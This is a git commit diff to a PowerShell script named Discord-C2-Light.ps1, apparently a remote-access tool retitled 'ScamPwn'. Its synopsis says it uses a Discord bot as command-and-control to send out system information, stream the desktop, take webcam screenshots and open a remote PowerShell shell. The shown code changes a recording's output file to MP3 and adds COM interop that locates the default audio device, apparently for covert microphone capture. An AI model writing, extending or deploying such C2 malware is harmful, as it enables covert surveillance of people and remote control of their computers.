2b5f767d0586d87167fe697f9b9c09d1f638b639
egieb <93350544+beigeworm@users.noreply.github.com>
2024-07-01 12:56:15 +0000

    Update Discord-C2-Light.ps1

--- Discord-C2-Light.ps1
+++ Discord-C2-Light.ps1
@@ -1,5 +1,6 @@
 
-<# =========================================  Discord System Recon ===========================================
+<# =========================================  ScamPwn - Discord x Windows Recon ===========================================
+
 **SYNOPSIS**
 Uses a Discord bot to send system information, a stream desktop and webcam screenshots,
 and open a powershell command line interface through discord.
@@ -340,8 +341,7 @@ $audiojob = {
             }
         }
     }
-    $outputFile = "$env:Temp\Audio.jpg"
-
+    $outputFile = "$env:Temp\Audio.mp3"
     Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
     function getFriendlyName($id) {
         $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
